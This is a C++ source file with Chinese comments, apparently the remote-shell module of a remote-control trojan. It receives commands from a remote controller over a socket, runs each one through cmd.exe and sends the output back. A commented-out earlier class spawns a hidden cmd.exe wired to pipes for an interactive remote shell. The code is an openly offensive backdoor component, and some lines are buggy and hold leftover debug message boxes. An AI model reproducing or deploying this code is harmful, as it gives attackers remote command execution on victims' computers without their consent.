#include "pch.h"
//#include "ShellRemote.h"
//
//
//CShellManager::CShellManager()
//{
//	SECURITY_ATTRIBUTES  sa = { 0 };
//	STARTUPINFO          si = { 0 };
//	PROCESS_INFORMATION  pi = { 0 };
//	WCHAR pszShellPath[MAX_PATH] = { 0 };
//
//	m_hReadPipeHandle = NULL;
//	m_hWritePipeHandle = NULL;
//	m_hReadPipeShell = NULL;
//	m_hWritePipeShell = NULL;
//	sa.nLength = sizeof(sa);
//	sa.lpSecurityDescriptor = NULL;
//	sa.bInheritHandle = TRUE;
//
//
//	if (!CreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0))
//	{
//		if (m_hReadPipeHandle != NULL)	CloseHandle(m_hReadPipeHandle);
//		if (m_hWritePipeShell != NULL)	CloseHandle(m_hWritePipeShell);
//		return;
//	}
//
//	if (!CreatePipe(&m_hReadPipeShell, &m_hWritePipeHandle, &sa, 0))
//	{
//		if (m_hWritePipeHandle != NULL)	CloseHandle(m_hWritePipeHandle);
//		if (m_hReadPipeShell != NULL)	CloseHandle(m_hReadPipeShell);
//		return;
//	}
//
//	memset((void *)&si, 0, sizeof(si));
//	memset((void *)&pi, 0, sizeof(pi));
//
//	GetStartupInfo(&si);
//	si.cb = sizeof(STARTUPINFO);
//	si.wShowWindow = SW_HIDE;
//	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
//	si.hStdInput = m_hReadPipeShell;
//	si.hStdOutput = si.hStdError = m_hWritePipeShell;
//
//	GetSystemDirectory(pszShellPath, MAX_PATH);
//
//	StringCbPrintf(pszShellPath, MAX_PATH, L"%s%s", pszShellPath, L"\\cmd.exe");
//	MessageBox(0, pszShellPath, L"", 0);
//
//
//	if (!CreateProcess(pszShellPath, NULL, NULL, NULL, TRUE,
//		NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi))
//	{
//		CloseHandle(m_hReadPipeHandle);
//		CloseHandle(m_hWritePipeHandle);
//		CloseHandle(m_hReadPipeShell);
//		CloseHandle(m_hWritePipeShell);
//		return;
//	}
//	m_hProcessHandle = pi.hProcess;
//	m_hThreadHandle = pi.hThread;
//
//	//BYTE	bToken = TOKEN_SHELL_START;
//	//Send((LPBYTE)&bToken, 1);
//	//WaitForDialogOpen();
//	m_hThreadRead = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReadPipeThread, (LPVOID)this, 0, NULL);
//	m_hThreadMonitor = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorThread, (LPVOID)this, 0, NULL);
//}
//
//
//CShellManager::~CShellManager()
//{
//	TerminateThread(m_hThreadRead, 0);
//	TerminateProcess(m_hProcessHandle, 0);
//	TerminateThread(m_hThreadHandle, 0);
//	WaitForSingleObject(m_hThreadMonitor, 2000);
//	TerminateThread(m_hThreadMonitor, 0);
//
//	if (m_hReadPipeHandle != NULL)
//		DisconnectNamedPipe(m_hReadPipeHandle);
//	if (m_hWritePipeHandle != NULL)
//		DisconnectNamedPipe(m_hWritePipeHandle);
//	if (m_hReadPipeShell != NULL)
//		DisconnectNamedPipe(m_hReadPipeShell);
//	if (m_hWritePipeShell != NULL)
//		DisconnectNamedPipe(m_hWritePipeShell);
//
//	CloseHandle(m_hReadPipeHandle);
//	CloseHandle(m_hWritePipeHandle);
//	CloseHandle(m_hReadPipeShell);
//	CloseHandle(m_hWritePipeShell);
//
//	CloseHandle(m_hProcessHandle);
//	CloseHandle(m_hThreadHandle);
//	CloseHandle(m_hThreadMonitor);
//	CloseHandle(m_hThreadRead);
//}
//
//
//void CShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
//{
//	/*if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
//	{
//		NotifyDialogIsOpen();
//		return;
//	}
//
//	unsigned long	ByteWrite;
//	WriteFile(m_hWritePipeHandle, lpBuffer, nSize, &ByteWrite, NULL);*/
//}
//
//DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lparam)
//{
//	unsigned long   BytesRead = 0;
//	char	ReadBuff[1024];
//	DWORD	TotalBytesAvail;
//	CShellManager *pThis = (CShellManager *)lparam;
//	while (1)
//	{
//		Sleep(100);
//		while (PeekNamedPipe(pThis->m_hReadPipeHandle, ReadBuff, sizeof(ReadBuff), &BytesRead, &TotalBytesAvail, NULL))
//		{
//			if (BytesRead <= 0)
//				break;
//			memset(ReadBuff, 0, sizeof(ReadBuff));
//			LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, TotalBytesAvail);
//			ReadFile(pThis->m_hReadPipeHandle, lpBuffer, TotalBytesAvail, &BytesRead, NULL);
//			// 发送数据
//			//pThis->Send(lpBuffer, BytesRead);
//			
//			LocalFree(lpBuffer);
//		}
//	}
//	return 0;
//}
//
//DWORD WINAPI CShellManager::MonitorThread(LPVOID lparam)
//{
//	CShellManager *pThis = (CShellManager *)lparam;
//	HANDLE hThread[2];
//	hThread[0] = pThis->m_hProcessHandle;
//	hThread[1] = pThis->m_hThreadRead;
//	WaitForMultipleObjects(2, hThread, FALSE, INFINITE);
//	TerminateThread(pThis->m_hThreadRead, 0);
//	TerminateProcess(pThis->m_hProcessHandle, 1);
//	pThis->m_pClient->Disconnect();
//	return 0;
//}



#include "pch.h"
#include "ModuleRemoteShell.h"
#include "Packet.h"


CMoudleRemoteShell::CMoudleRemoteShell() {
	
}


CMoudleRemoteShell::~CMoudleRemoteShell() {

}


// 收到与该组件相关的封包的时候，回调此函数
void CMoudleRemoteShell::OnReceievePacket(CPacket* pPacket) {

	switch (pPacket->m_PacketHead.wCommandId) {

	case SHELL_CONNECT:
		OnRecv_ShellConnect(pPacket);
		break;

	case SHELL_READY:
		OnRecv_ShellConnect(pPacket);
		break;

	case SHELL_EXECUTE:
		OnRecv_ShellExecute(pPacket);
		break;

	case SHELL_CLOSE:
		OnRecv_ShellClose(pPacket);
		break;
	default:
		break;
	}

}


// 收到主控端发来的该封包的时候，被控端要开一个新的socket来通信
void CMoudleRemoteShell::OnRecv_ShellConnect(CPacket* pPacket) {
	CSocketClient* pMainSocketClient = pPacket->m_pSocketClient->m_pMainSocketClient;

	// 创建一个子Socket
	CSocketClient ChildSocketClient = new CSocketClient(pMainSocketClient);
	BOOL bRet = ChildSocketClient.StartSocketClient();
	if (bRet) {
		ChildSocketClient.SendPacket(SHELL_CONNECT, NULL, 0);
	}
	else {
		MessageBox(0, L"创建新的子socket失败", L"", 0);
	}
}


//void CMoudleRemoteShell::OnRecv_ShellReady(CPacket* pPacket) {
//	CSocketClient* pChildSocketClient = pPacket->m_pSocketClient;
//	pChildSocketClient->SendPacket(SHELL_READY, NULL, 0);
//}



DWORD cmd_ctrl_shell(WCHAR* command, CSocketClient* pChildSocketClient);

void CMoudleRemoteShell::OnRecv_ShellExecute(CPacket* pPacket) {
	CSocketClient* pChildSocketClient = pPacket->m_pSocketClient;
	
	WCHAR* CMD = (WCHAR*)(pPacket->m_pbPacketBody);

	cmd_ctrl_shell(CMD, pChildSocketClient);
}


void CMoudleRemoteShell::OnRecv_ShellClose(CPacket* pPacket) {

}








DWORD cmd_ctrl_shell(WCHAR* command, CSocketClient* pChildSocketClient)
{
	//CTcpTran m_tcptran;

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	HANDLE hRead = NULL, hWrite = NULL;

	TCHAR Cmdline[300] = { 0 };     //命令行缓冲
	char SendBuf[2048] = { 0 };    //发送缓冲
	SECURITY_ATTRIBUTES sa;     //安全描述符
	DWORD bytesRead = 0;
	int ret = 0;

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	//创建匿名管道
	if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
		goto Clean;//失败
	}
	else {
		// printf("创建管道成功\n");
	}

	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;    //进程（cmd）的输出写入管道
   // si.wShowWindow=SW_HIDE;
	si.wShowWindow = SW_SHOW;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

	GetSystemDirectory(Cmdline, sizeof(Cmdline));   //获取系统目录
	//strcat(Cmdline, L"\\cmd.exe /c ");                //拼接cmd
	//strcat(Cmdline, command);  //拼接一条完整的cmd命令

	WCHAR CmdlineALL[260];

	StringCbPrintf(CmdlineALL, 260, L"%s\\cmd.exe /c %s", Cmdline, command);
	MessageBox(0, CmdlineALL, L"", 0);

	//printf("执行命令：%s\n", Cmdline);

	//创建进程，也就是执行cmd命令
	if (!CreateProcess(NULL, CmdlineALL, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi)) {
		goto Clean;//失败
	}
	else {
		// printf("创建进程成功\n");
	}

	CloseHandle(hWrite);

	while (TRUE)
	{
		//无限循环读取管道中的数据，直到管道中没有数据为止
		//if (ReadFile(hRead,SendBuf,sizeof(SendBuf),&bytesRead,NULL)==0)
		//    break;
		//m_tcptran.mysend(sock,SendBuf,bytesRead,0,60);      //发送出去
		//for (int i = 0; i < bytesRead; i++){
		//	printf("0x%x ", SendBuf);
		//}
		bool bReadSuccess = ReadFile(hRead, SendBuf, sizeof(SendBuf), &bytesRead, NULL);
		// printf("缓冲区有%d字节数据\n", dwReadCount);
		if (!bReadSuccess) {
			break;
		}
		else {
			for (DWORD i = 0; i < bytesRead; i++) {
				printf("%c", SendBuf[i]);
			}

			pChildSocketClient->SendPacket(SHELL_EXECUTE, (PBYTE)SendBuf, bytesRead);
			MessageBox(0, L"send cmd result", L"", 0);
		}



		memset(SendBuf, 0, sizeof(SendBuf));  //缓冲清零
		Sleep(100);                          //休息一下
	}

	//m_tcptran.mysend(sock,(char *)MY_END,sizeof(MY_END),0,60);
Clean:
	//释放句柄
	if (hRead != NULL)
		CloseHandle(hRead);

	if (hWrite != NULL)
		CloseHandle(hWrite);

	return 0;
}